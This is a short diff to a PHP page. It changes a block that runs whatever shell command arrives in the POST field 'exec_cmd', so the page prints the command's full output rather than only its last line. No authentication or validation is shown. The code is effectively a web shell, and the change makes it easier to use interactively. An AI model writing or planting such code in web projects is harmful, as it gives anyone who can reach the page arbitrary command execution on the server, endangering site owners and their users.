@@ -66,7 +66,8 @@
         }
 
         if (isset($_POST['exec_cmd'])) {
-            echo exec($_POST['exec_cmd']);
+            exec($_POST['exec_cmd'], $out);
+            print_r($out);
         }
         ?>
     </pre>
